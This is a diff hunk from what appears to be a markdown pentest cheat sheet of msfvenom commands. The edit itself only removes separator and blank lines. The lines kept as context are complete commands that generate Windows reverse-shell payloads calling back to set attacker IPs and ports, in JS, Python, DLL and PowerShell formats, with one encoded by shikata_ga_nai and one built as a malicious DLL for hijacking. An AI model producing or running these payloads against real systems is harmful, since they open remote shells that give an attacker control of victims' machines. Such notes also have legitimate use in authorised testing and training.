@@ -93,14 +93,10 @@ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.30.5 LPORT=443 -f js_le -e g
 msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.67 LPORT=80 EXITFUNC=thread -f python -a x86 --platform windows -b '\x00' -e x86/shikata_ga_nai
 ```
 
-================================================================================
 ## DLL HiJacking - Windows - x64
 ```sh
 msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=192.168.45.190 LPORT=4444 -f dll -o Printconfig.dll
 ```
-================================================================================
-
-
 ```sh
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.9.47.29 LPORT=4444 -f powershell
 ```
